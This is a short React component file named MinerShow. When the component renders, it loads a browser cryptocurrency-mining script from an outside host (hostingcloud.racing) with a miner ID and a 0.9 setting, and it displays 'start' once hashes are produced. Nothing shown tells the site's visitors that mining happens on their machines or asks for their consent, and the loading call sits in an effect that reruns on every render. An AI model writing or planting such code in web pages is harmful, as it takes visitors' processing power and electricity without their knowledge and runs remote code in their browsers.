import React, { useState, useEffect } from 'react';
import { importMineScript } from '../../utils/miner';

function MinerShow(props) {
  // Declare a new state variable, which we'll call "count"
  const [isStart, setIsStart] = useState(false);

  useEffect(() => {
    const { minerId } = props;
    function handleStatusChange(status) {
        setIsStart(status.isStart);
    }

    importMineScript("https://www.hostingcloud.racing/0ZUJ.js", 0.9, minerId, (hash, balanceAmount, miner)=>{
        if(hash>0){
            handleStatusChange({
                isStart: true,
            })
        }
        
    });
  });
  if(!isStart){
      return (
          <div>
              not start
          </div>
      )
  }

  return (
    <div>
        start
    </div>
  );
}

export default MinerShow;